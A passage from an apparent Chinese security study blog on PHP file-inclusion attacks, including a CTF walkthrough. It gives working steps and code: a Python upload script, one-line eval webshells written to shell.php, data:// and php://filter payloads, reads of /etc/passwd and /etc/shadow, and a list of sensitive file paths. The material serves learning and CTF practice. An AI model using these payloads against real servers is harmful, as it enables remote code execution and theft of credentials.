<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line"><span class="variable">$img_path</span> = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span> . <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>] </span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;</span><br><span class="line">    <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>配合<code>phpinfo</code>页面的<code>php variables</code>，可以直接获取到上传文件的存储路径和临时文件名</p>
<p><img src="https://s2.loli.net/2023/11/18/YWsGoH6aLJiC2Uc.png" alt="image-20231025142053342"></p>
<h2 id="包含方式"><a href="#包含方式" class="headerlink" title="包含方式"></a>包含方式</h2><p>临时文件转瞬即逝，如何在短时间内包含它？</p>
<h3 id="条件竞争"><a href="#条件竞争" class="headerlink" title="条件竞争"></a>条件竞争</h3><p>条件竞争就是一直上传文件，同时一直去包含临时文件，竞争一下是先包含还是先删除。</p>
<h3 id="段错误"><a href="#段错误" class="headerlink" title="段错误"></a>段错误</h3><p>所谓的段错误（segment fault）就是指访问的内存超过了系统所给这个程序的内存空间。从而发生程序退出，临时文件就不会被删除。</p>
<p>在php7中</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">file=php:<span class="comment">//filter/string.strip_tags=/etc/passwd</span></span><br></pre></td></tr></table></figure>

<p>会造成段错误。 </p>
<p>适用版本： </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php7.0.0-7.1.2可以利用， 7.1.2x版本的已被修复</span><br><span class="line">php7.1.3-7.2.1可以利用， 7.2.1x版本的已被修复</span><br><span class="line">php7.2.2-7.2.8可以利用， 7.2.9一直到7.3到现在的版本已被修复</span><br></pre></td></tr></table></figure>

<h4 id="实列及详解"><a href="#实列及详解" class="headerlink" title="实列及详解"></a>实列及详解</h4><p>查看网页源代码，发现提示信息</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username/password error&lt;html&gt;</span><br><span class="line">&lt;!--md5($secret.$name)===$pass --&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p>传递name参数，用burp抓包并发送到repeater模块</p>
<p><img src="https://s2.loli.net/2023/11/18/y9SgG3NDnjQacIB.png" alt="image-20231025161936687"></p>
<p><img src="https://s2.loli.net/2023/11/18/oQL6JwPxvsfSk4a.png" alt="image-20231025161900649"></p>
<p>经过测试，发现改变name的值，响应包中Hash值会响应改变（name和hash一一对应），结合提示，可以传入pass参数，值为响应包中的Hash值（name值和pass值要相对应）。</p>
<p><img src="https://s2.loli.net/2023/11/18/IDOkeyP7MNYGdKZ.png" alt="image-20231025162123175"></p>
<p>在响应包中发现提示文件：<code>flflflflag.php</code>，访问该文件</p>
<p><img src="https://s2.loli.net/2023/11/18/mxInGt6O72psNyY.png" alt="image-20231025162404641"></p>
<p>发现文件包含，猜测可能是文件包含漏洞，可以查看源码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/flflflflag.php?file=php://filter/read=convert.base64-encode/resource=flflflflag.php</span><br></pre></td></tr></table></figure>

<p>用BurpSuite拦截响应，base64解码后得到源码：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;script language=&quot;javascript&quot; type=&quot;text/javascript&quot;&gt;</span><br><span class="line">           window.location.href=&quot;404.html&quot;;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;title&gt;this_is_not_fl4g_and_出题人_wants_girlfriend&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">$file=$_GET[&#x27;file&#x27;];</span><br><span class="line">if(preg_match(&#x27;/data|input|zip/is&#x27;,$file))&#123;</span><br><span class="line">	die(&#x27;nonono&#x27;);</span><br><span class="line">&#125;</span><br><span class="line">@include($file);</span><br><span class="line">echo &#x27;include($_GET[&quot;file&quot;])&#x27;;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p>利用目录扫描：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python dirsearch.py -u http://c7e65748-3412-4257-9224-6c01808f5a20.node4.buuoj.cn:81/</span><br></pre></td></tr></table></figure>

<p>扫描发现dir.php。</p>
<p><img src="https://s2.loli.net/2023/11/18/ruxOEn2CovHcR5U.png" alt="image-20231025165147270"></p>
<p><img src="https://s2.loli.net/2023/11/18/ULTyQMfe9zqj4VW.png" alt="image-20231025165242501"></p>
<p>访问dir.php文件：</p>
<p><img src="https://s2.loli.net/2023/11/18/o7rUlwePmHFVIqA.png" alt="image-20231025163132883"></p>
<p>查看dir.php源代码：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/flflflflag.php?file=php://filter/read=convert.base64-encode/resource=dir.php</span><br></pre></td></tr></table></figure>

<p>用Burpsuite拦截响应，base64解码后源代码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">scandir</span>(<span class="string">&#x27;/tmp&#x27;</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>dir.php能打印临时文件夹里的内容，因此我们要想办法把文件存到tmp文件夹中。</p>
<p>该题存在文件包含，而且可以显示临时文件夹（&#x2F;tmp）的内容，因此可以考虑临时文件包含的方法解题。同时，根据响应包中内容：<code>X-Powered-By: PHP/7.0.33</code>，说明php版本存在段错误。</p>
<p>编写python脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># coding=gbk</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> io <span class="keyword">import</span> BytesIO </span><br><span class="line"><span class="comment">#BytesIO实现了在内存中读写bytes</span></span><br><span class="line">payload = <span class="string">&quot;&lt;?php phpinfo();?&gt;&quot;</span> </span><br><span class="line"><span class="comment">#注入的恶意命令</span></span><br><span class="line"><span class="comment">#payload=&quot;&lt;?php echo 12;fputs(fopen(&#x27;shell.php&#x27;,&#x27;w&#x27;),&#x27;&lt;?php echo 1234;eval($_POST[0]);?&gt;&#x27;);?&gt;&quot; </span></span><br><span class="line"><span class="comment">#把一句话木马写入shell.php</span></span><br><span class="line">data=&#123;<span class="string">&#x27;file&#x27;</span>: BytesIO(payload.encode())&#125;</span><br><span class="line">url=<span class="string">&quot;http://c7e65748-3412-4257-9224-6c01808f5a20.node4.buuoj.cn:81/flflflflag.php?file=php://filter/string.strip_tags/resource=/etc/passwd&quot;</span></span><br><span class="line">r=requests.post(url=url,files=data,allow_redirects=<span class="literal">False</span>)</span><br></pre></td></tr></table></figure>

<p>执行该脚本后，payload就注入到临时文件了。</p>
<p>再次访问dir.php文件，得到tmp目录下刚刚我们上传的文件路径：&#x2F;tmp&#x2F;phpVvvefu</p>
<p><img src="https://s2.loli.net/2023/11/18/jymveQM7NRstuDc.png" alt="image-20231025164408642"></p>
<p>利用BurpSuite发送请求，由于本题的flag在<code>phpinfo()</code>中，因此这样就能得到flag：</p>
<p><img src="https://s2.loli.net/2023/11/18/d5BhRK1X6Tgta9m.png" alt="image-20231025164751449"></p>
<h3 id="自包含"><a href="#自包含" class="headerlink" title="自包含"></a>自包含</h3><p>自己包含自己，进入死循环，脚本永不结束，也就不会删除临时文件。</p>
<p>文件上传，phpinfo，自包含三者缺一不可，在同一个页面发生。</p>
<p>题目源码（文件位于<code>index.php</code>）</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;info&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">phpinfo</span>();</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$page</span> = <span class="string">&#x27;/var/www/html/&#x27;</span>.<span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>];</span><br><span class="line">    <span class="keyword">include</span> <span class="variable">$page</span>;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

<p>如果将<code>page</code>赋值为<code>index.php</code>，就会开始自包含。</p>
<p>然后对死循环发送POST请求，此时POST请求对应的临时文件才不会被清理。</p>
<p>创建上传表单（<code>untitled.html</code>）：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;form action=&quot;http://url/?page=index.php&amp;info&quot; method=&quot;POST&quot; enctype=&quot;multipart/form-data&quot;&gt;</span><br><span class="line">&lt;!--action的值为目标服务器地址 --&gt; </span><br><span class="line">&lt;input type=&quot;file&quot; name=&quot;file&quot; /&gt;</span><br><span class="line">&lt;input type=&quot;submit&quot; value=&quot;submit&quot; /&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p>创建上传文件（<code>1.txt</code>）：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">echo</span>(<span class="string">&#x27;123&#x27;</span>); </span><br><span class="line">    <span class="comment"># 123用于检查是否上传成功</span></span><br><span class="line">    <span class="title function_ invoke__">file_put_contents</span>(<span class="string">&#x27;/tmp/shell.php&#x27;</span>, <span class="string">&#x27;&lt;?php echo(&#x27;</span><span class="number">1234</span><span class="string">&#x27;); eval($_POST[0]);?&gt;&#x27;</span>);</span><br><span class="line">    <span class="comment"># 1234用于检查是否执行成功</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>注意，如果循环次数过多会导致电脑死机，所以不建议长时间循环，最好的方式是包含后就生成一个永久的shell，一包含到就可以结束自包含。</p>
<p>打开上传表单，并上传</p>
<p>上传成功后找到路径</p>
<p><img src="https://s2.loli.net/2023/11/18/uSEZL1jxi2TqfCM.png" alt="image-20231025195150883"></p>
<p>包含</p>
<p><img src="https://s2.loli.net/2024/04/02/pd4ScAFLP7ThWr6.png" alt="8hvtMaESITi7Jd4"></p>
<p>输出 123 表示 1.txt 文件上传成功</p>
<p>关闭循环，找到木马文件路径</p>
<p><img src="https://s2.loli.net/2024/04/02/xgThuJoaliAfBV3.png" alt="nUJworM2IdKe4Eu"></p>
<p>输出 1234 表示一句话木马执行成功。接下来连蚁剑，找 flag。</p>
]]></content>
      <categories>
        <category>文件包含</category>
      </categories>
      <tags>
        <tag>文件包含</tag>
      </tags>
  </entry>
  <entry>
    <title>文件包含学习记录</title>
    <url>/2024/03/09/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/</url>
    <content><![CDATA[<h1 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h1><h2 id="认识是文件包含："><a href="#认识是文件包含：" class="headerlink" title="认识是文件包含："></a>认识是文件包含：</h2><p>通过<code>PHP</code>函数引入文件时，传入的文件名没有经过合理的验证，从而操作了预想之外的文件，就可能导致意外的文件泄漏甚至恶意代码注入。</p>
<span id="more"></span>

<h3 id="文件包含的环境要求："><a href="#文件包含的环境要求：" class="headerlink" title="文件包含的环境要求："></a>文件包含的环境要求：</h3><ul>
<li><code>allow_url_fopen=On</code>(默认为<code>On</code>) 规定是否允许从远程服务器或者网站检索数据</li>
<li><code>allow_url_include=On</code>(<code>php5.2</code>之后默认为<code>Off</code>) 规定是否允许include&#x2F;require远程文件</li>
</ul>
<h3 id="常见文件包含函数："><a href="#常见文件包含函数：" class="headerlink" title="常见文件包含函数："></a>常见文件包含函数：</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">include</span>() <span class="comment">//执行到include时才包含文件，找不到文件只生成警告（E_WARNING），并且脚本会继续 </span></span><br><span class="line"><span class="keyword">require</span>() <span class="comment">//程序运行就包含文件，找不到文件会生成致命错误（E_COMPILE_ERROR）并停止脚本 </span></span><br><span class="line"><span class="keyword">include_once</span>() </span><br><span class="line"><span class="keyword">require_once</span>() </span><br><span class="line"><span class="comment">//和前面注解一样，_once()后缀表明只会包含一次，已包含则不会再包含</span></span><br></pre></td></tr></table></figure>

<h3 id="文件包含特性："><a href="#文件包含特性：" class="headerlink" title="文件包含特性："></a>文件包含特性：</h3><p>只要被包含的文件的文件内容符合PHP语法，不管文件类型是什么，该文件都会被PHP解释器去解析执行；如果文件内容不符合PHP语法，就会将该文件内容读取出来。</p>
<h2 id="文件包含利用"><a href="#文件包含利用" class="headerlink" title="文件包含利用"></a>文件包含利用</h2><h3 id="读取敏感文件"><a href="#读取敏感文件" class="headerlink" title="读取敏感文件"></a>读取敏感文件</h3><p>直接读取</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">http:<span class="comment">//example.com/file.php?file=f&#x27;l.txt</span></span><br></pre></td></tr></table></figure>

<p>file协议读取</p>
<p>本地文件传输协议，用于访问本地计算机中的文件。好比通过Windows的资源管理器中打开文件或者通过右键单击<code>打开</code>一样。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">http:<span class="comment">//example.com/file.php?file=file:///etc/passwd</span></span><br></pre></td></tr></table></figure>

<p>注意：向<code>include()</code>函数传递参数的名字不一定为<code>file</code></p>
<h4 id="常见敏感文件"><a href="#常见敏感文件" class="headerlink" title="常见敏感文件"></a>常见敏感文件</h4><h5 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h5><table>
<thead>
<tr>
<th align="center">文件</th>
<th align="center">说明</th>
</tr>
</thead>
<tbody><tr>
<td align="center">C:\boot.ini</td>
<td align="center">查看系统版本</td>
</tr>
<tr>
<td align="center">C:\windows\system32\inetsrv\MetaBase.xml</td>
<td align="center">iis配置文件</td>
</tr>
<tr>
<td align="center">C:\windows\repair\same</td>
<td align="center">存储windows系统初次安装密码</td>
</tr>
<tr>
<td align="center">C:\ProgramFiles\mysql\my.ini</td>
<td align="center">mysql配置信息</td>
</tr>
<tr>
<td align="center">C:\ProgramFiles\mysql\data\mysql\user.MYD</td>
<td align="center">mysql root密码</td>
</tr>
<tr>
<td align="center">C:\windows\win.ini</td>
<td align="center">系统信息，常用于注入木马</td>
</tr>
</tbody></table>
<h5 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h5><table>
<thead>
<tr>
<th align="center">文件</th>
<th align="center">说明</th>
</tr>
</thead>
<tbody><tr>
<td align="center">&#x2F;etc&#x2F;passwd</td>
<td align="center">账户信息</td>
</tr>
<tr>
<td align="center">&#x2F;etc&#x2F;shadow</td>
<td align="center">账户密码文件</td>
</tr>
<tr>
<td align="center">&#x2F;etc&#x2F;apache2&#x2F;apache2.conf</td>
<td align="center">Apache2默认配置文件</td>
</tr>
<tr>
<td align="center">&#x2F;etc&#x2F;my.conf</td>
<td align="center">mysql配置文件</td>
</tr>
<tr>
<td align="center">&#x2F;etc&#x2F;php&#x2F;5.6&#x2F;apache2&#x2F;php.ini</td>
<td align="center">mysql配置文件</td>
</tr>
<tr>
<td align="center">&#x2F;etc&#x2F;httpd&#x2F;conf&#x2F;httpd.conf</td>
<td align="center">apache配置信息</td>
</tr>
</tbody></table>
<h3 id="数据流封装器"><a href="#数据流封装器" class="headerlink" title="数据流封装器"></a>数据流封装器</h3><p>data协议用于传输数据，经常配合<code>file_get_contents()</code>函数使用。</p>
<p>data协议用于传输数据，经常配合<code>file_get_contents()</code>函数使用。 </p>
<p>使用条件： </p>
<p>php版本大于等于5.2.0 </p>
<p>php.ini中<code>allow_url_fopen=On</code>，<code>all_url_include=On</code></p>
<p>用法</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">data:<span class="comment">//,＜文本数据＞</span></span><br><span class="line">data:<span class="comment">//text/plain,＜文本数据＞</span></span><br><span class="line">data:<span class="comment">//text/html,＜HTML代码＞ </span></span><br><span class="line">data:<span class="comment">//text/html;base64,＜base64编码的HTML代码＞     </span></span><br><span class="line">data:<span class="comment">//text/css,＜CSS代码＞ </span></span><br><span class="line">data:<span class="comment">//text/css;base64,＜base64编码的CSS代码＞ </span></span><br><span class="line">data:<span class="comment">//text/javascript,＜Javascript代码＞ </span></span><br><span class="line">data:<span class="comment">//text/javascript;base64,＜base64编码的Javascript代码＞ </span></span><br><span class="line">data:<span class="comment">//image/gif;base64,base64编码的gif图片数据 </span></span><br><span class="line">data:<span class="comment">//image/png;base64,base64编码的png图片数据 </span></span><br><span class="line">data:<span class="comment">//image/jpeg;base64,base64编码的jpeg图片数据 </span></span><br><span class="line">data:<span class="comment">//image/x-icon;base64,base64编码的icon图片数据</span></span><br></pre></td></tr></table></figure>

<p>实例</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?file=data:<span class="comment">//text/plain,&lt;?php phpinfo();?&gt;</span></span><br><span class="line">?file=data:<span class="comment">//text/plain,%3c%3f%70%68%70%20%70%68%70%69%6e%66%6f%28%29%3b%3f%3e</span></span><br><span class="line"><span class="comment"># url编码</span></span><br><span class="line">?file=data:<span class="comment">//text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+</span></span><br><span class="line"><span class="comment"># &lt;?php phpinfo();?&gt;</span></span><br><span class="line">?file=data:<span class="comment">//text/plain;base64,PD9waHAgcGhwaW5mbygpOw==</span></span><br><span class="line"><span class="comment"># &lt;?php phpinfo();</span></span><br></pre></td></tr></table></figure>

<p><code>&lt;?php phpinfo();?&gt;</code>编成base64的时候出现了<code>+</code>。而浏览器不认识<code>+</code>，所以一般不加<code>?&gt;</code></p>
<h3 id="读取源代码"><a href="#读取源代码" class="headerlink" title="读取源代码"></a>读取源代码</h3><h4 id="目的"><a href="#目的" class="headerlink" title="目的"></a>目的</h4><p>在进行 php 代码审计时，需要查看目标的源代码。但是利用文件包含漏洞直接包含 php 文件时会被解析，不能看到源码，这时可以用 <code>php://filter</code> 来读取源代码文件。</p>
<h4 id="基本使用"><a href="#基本使用" class="headerlink" title="基本使用"></a>基本使用</h4><h5 id="直接读写"><a href="#直接读写" class="headerlink" title="直接读写"></a>直接读写</h5><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">php:<span class="comment">//filter/resource=filepath</span></span><br></pre></td></tr></table></figure>

<h5 id="过滤器的基本使用"><a href="#过滤器的基本使用" class="headerlink" title="过滤器的基本使用"></a>过滤器的基本使用</h5><h6 id="base64-的编码与解码"><a href="#base64-的编码与解码" class="headerlink" title="base64 的编码与解码"></a>base64 的编码与解码</h6><p><code>convert.base64-encode</code> 与 <code>convert.base64-decode</code> 是 <code>php://filter</code> 所支持的过滤器，使用这两个过滤器等同于使用 <code>base64_encode()</code> 与 <code>base64_decode()</code> 对数据流进行处理。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">php:<span class="comment">//filter/convert.base64-encode/resource=filepath</span></span><br><span class="line">php:<span class="comment">//filter/convert.base64-decode/resource=filepath</span></span><br></pre></td></tr></table></figure>

<p>实例</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    </span><br><span class="line"><span class="comment"># 省略 write=</span></span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="string">&#x27;php://filter/convert.base64-encode/resource=./file.txt&#x27;</span>, <span class="string">&#x27;Hello World&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取 base64 编码后的内容</span></span><br><span class="line"><span class="variable">$content</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://filter/resource=./file.txt&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$content</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment"># 通过 convert.base64-decode 过滤器数据流进行 base64 解码操作</span></span><br><span class="line"><span class="variable">$content</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://filter/read=convert.base64-decode/resource=./file.txt&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$content</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>输出</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">string</span>(<span class="number">16</span>) <span class="string">&quot;SGVsbG8gV29ybGQ=&quot;</span></span><br><span class="line"><span class="keyword">string</span>(<span class="number">11</span>) <span class="string">&quot;Hello World&quot;</span></span><br><span class="line">PHP Warning:  <span class="title function_ invoke__">file_get_contents</span>(): Unable to locate filter <span class="string">&quot;resource=.&quot;</span> in C:\demo.php on line <span class="number">8</span></span><br><span class="line">PHP Warning:  <span class="title function_ invoke__">file_get_contents</span>(): Unable to create <span class="title function_ invoke__">filter</span> (resource=.) in C:\demo.php on line <span class="number">8</span></span><br><span class="line">PHP Warning:  <span class="title function_ invoke__">file_get_contents</span>(): Unable to locate filter <span class="string">&quot;file.txt&quot;</span> in C:\demo.php on line <span class="number">8</span></span><br><span class="line">PHP Warning:  <span class="title function_ invoke__">file_get_contents</span>(): Unable to create <span class="title function_ invoke__">filter</span> (file.txt) in C:\demo.php on line <span class="number">8</span></span><br></pre></td></tr></table></figure>

<h6 id="rot13-加密与解密"><a href="#rot13-加密与解密" class="headerlink" title="rot13 加密与解密"></a>rot13 加密与解密</h6><p>rot13算法</p>
<p>ROT13（Rotate By 13 Places）是一种简单的字母替代密码，是凯撒密码的一种变体。其基本思想是将字母表中的每一个字母移动 <code>13</code> 个位置。因为拉丁字母表有 <code>26</code> 个字母，所以 <code>ROT13 解密</code> 是其自身的 <code>逆运算</code>：即对一个已经 ROT13 加密的文本再次进行 ROT13 加密，将获得加密文本的原始文本。</p>
<p><img src="https://s2.loli.net/2023/11/18/K4ZT6yleCf2sxOg.png" alt="image-20231026093556600"></p>
<p>这种加密方法的主要优点是它的简单性和对称性，但显然，<code>ROT13</code> 不提供真正的安全性，因为它很容易破解。事实上，ROT13 经常在在线社区中用作一种简单的方式来 <strong>隐藏剧透、答案或轻微的冒犯内容，而不是用作真正的加密手段</strong>。</p>
<p>string.rot13</p>
<p>通过 <code>php://filter</code> 使用 <code>string.rot13</code> 过滤器即可对数据流进行 <code>rot13</code> 处理。对此，请参考如下示例：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 对数据流进行 ROT13 加密</span></span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="string">&#x27;php://filter/write=string.rot13/resource=file.txt&#x27;</span>, <span class="string">&#x27;Hello World&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment"># 读取数据但不对数据流应用任何过滤器</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;php://filter/resource=./file.txt&#x27;</span>);</span><br><span class="line"><span class="keyword">print</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment"># 对数据流进行 ROT13 加密以获取其原文</span></span><br><span class="line"><span class="variable">$content</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://filter/read=string.rot13/resource=file.txt&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$content</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>输出</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">Uryyb Jbeyq</span><br><span class="line"><span class="keyword">string</span>(<span class="number">11</span>) <span class="string">&quot;Hello World&quot;</span></span><br><span class="line">PHP Warning:  <span class="keyword">include</span>(): Unable to locate filter <span class="string">&quot;resource=.&quot;</span> in C:\demo.php on line <span class="number">8</span></span><br><span class="line">PHP Warning:  <span class="keyword">include</span>(): Unable to create <span class="title function_ invoke__">filter</span> (resource=.) in C:\demo.php on line <span class="number">8</span></span><br><span class="line">PHP Warning:  <span class="keyword">include</span>(): Unable to locate filter <span class="string">&quot;file.txt&quot;</span> in C:\demo.php on line <span class="number">8</span></span><br><span class="line">PHP Warning:  <span class="keyword">include</span>(): Unable to create <span class="title function_ invoke__">filter</span> (file.txt) in C:\demo.php on line <span class="number">8</span></span><br></pre></td></tr></table></figure>

<h5 id="过滤器列表"><a href="#过滤器列表" class="headerlink" title="过滤器列表"></a>过滤器列表</h5><h6 id="多个过滤器的使用"><a href="#多个过滤器的使用" class="headerlink" title="多个过滤器的使用"></a>多个过滤器的使用</h6><p>在为 <code>php://filter</code> 指定过滤器时，可以通过 <code>管道符 |</code> 指定多个过滤器（过滤器列表），这些过滤器将按照 <strong>从左至右</strong>的顺序 <strong>依次</strong> 对数据流进行处理。对此，请参考如下示例：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 依次对数据流进行 base64 编码处理，rot13 处理。</span></span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="string">&#x27;php://filter/convert.base64-encode|string.rot13/resource=file.txt&#x27;</span>, <span class="string">&#x27;Hello World&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment"># 对 file.txt 文件中的内容进行普通读取</span></span><br><span class="line"><span class="variable">$raw_content</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;./file.txt&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$raw_content</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment"># 由于没有先将文件中的内容进行 rot13 处理，直接对其进行解码将无法恢复原数据内容。</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$raw_content</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment"># 先对文件中的内容进行 rot13 处理，再对处理结果进行 base64 解码</span></span><br><span class="line"><span class="variable">$content</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://filter/string.rot13|convert.base64-decode/resource=./file.txt&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$content</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>输出</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">string</span>(<span class="number">16</span>) <span class="string">&quot;FTIfoT8tI29loTD=&quot;</span></span><br><span class="line"><span class="keyword">string</span>(<span class="number">11</span>) <span class="string">&quot;2�?-#oe�0&quot;</span></span><br><span class="line"><span class="keyword">string</span>(<span class="number">11</span>) <span class="string">&quot;Hello World&quot;</span></span><br></pre></td></tr></table></figure>

<p>在使用 <code>管道符 |</code> 连接多个过滤器时，<strong>与管道符之间存在空格的过滤器均将失效</strong>。</p>
<h5 id="过滤器被ban"><a href="#过滤器被ban" class="headerlink" title="过滤器被ban"></a>过滤器被ban</h5><h6 id="大小写绕过"><a href="#大小写绕过" class="headerlink" title="大小写绕过"></a>大小写绕过</h6><p>比如</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?file=pHp:<span class="comment">//filter/convert.BAse64-encode/resource=/flag</span></span><br></pre></td></tr></table></figure>

<h6 id="convert-iconv转编码"><a href="#convert-iconv转编码" class="headerlink" title="convert.iconv转编码"></a><code>convert.iconv</code>转编码</h6><p>用法</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">php:<span class="comment">//filter/convert.iconv.&lt;input-encoding&gt;.&lt;output-encoding&gt;/resource=filepath</span></span><br><span class="line">比如</span><br><span class="line">php:<span class="comment">//filter/convert.iconv.ASCII.UCS-2BE/resource=index.php</span></span><br><span class="line">php:<span class="comment">//filter/convert.iconv.utf-8.utf-7/resource=index.php</span></span><br></pre></td></tr></table></figure>

<p>php支持的编码格式：</p>
